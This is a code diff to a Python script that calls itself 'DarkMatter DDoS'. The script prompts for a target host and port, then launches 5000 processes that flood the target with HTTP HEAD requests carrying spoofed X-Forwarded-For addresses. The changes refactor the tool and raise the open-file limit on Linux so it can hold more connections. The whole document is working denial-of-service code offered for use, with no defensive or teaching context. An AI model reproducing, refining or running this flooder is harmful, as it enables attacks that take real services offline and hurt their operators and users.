@@ -1,42 +1,31 @@
 import socket
-import os, sys
-import time
-import multiprocessing, random
-from fake_useragent import UserAgent
+import os
+from time import sleep
+import multiprocessing
+import random
+import platform
 
-print("Welcome To DarkMatter DDoS")
-ip = input("IP/Domain: ")
-port = int(input("Port: "))
+print("Detecting System...")
+sysOS = platform.system()
+print("System detected: ", sysOS)
 
-url = "http://" + str(ip)
-def Agent():
-	user_agent = UserAgent().random
-	return user_agent
+if sysOS == "Linux":
+  try:
+    os.system("ulimit -n 9030000")
+  except Exception as e:
+    print(e)
+    print("Could not start the script")
+else:
+  print("Your system is not Linux, You may not be able to run this script in some systems")
+
 
 def randomip():
-  randip = []
-  randip1 = random.randint(1,255)
-  randip2 = random.randint(1,255)
-  randip3 = random.randint(1,255)
-  randip4 = random.randint(1,255)
-  
-  randip.append(randip1)
-  randip.append(randip2)
-  randip.append(randip3)
-  randip.append(randip4)
-
-  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
-  return(randip)
-
-print("[>>>] Starting the attack [<<<]")
-
-
-time.sleep(1)
+  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
+  return randip
 
 
 def attack():
   connection = "Connection: null\r\n"
-  useragent = "User-Agent: " + Agent() + "\r\n"
   referer = "Referer: null\r\n"
   forward = "X-Forwarded-For: " + randomip() + "\r\n"
   get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
@@ -46,13 +35,19 @@ def attack():
       atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       atk.connect((ip, port))
       #Attack starts here
-      for y in range(100):
+      for y in range(80):
           atk.send(str.encode(request))
     except socket.error:
-      time.sleep(.1)
+      sleep(0)
     except:
       pass
 
+print("Welcome To DarkMatter DDoS\n")
+ip = input("IP/Domain: ")
+port = int(input("Port: "))
+url = f"http://{str(ip)}"
+print("[>>>] Starting the attack [<<<]")
+sleep(1)
 
 def send2attack():
   for i in range(5000): #Magic Power
@@ -60,4 +55,5 @@ def send2attack():
     mp.setDaemon = False
     mp.start() #Magic Starts
 
-send2attack() #61 lines for the most powerful attack, cool?
+    
+send2attack()
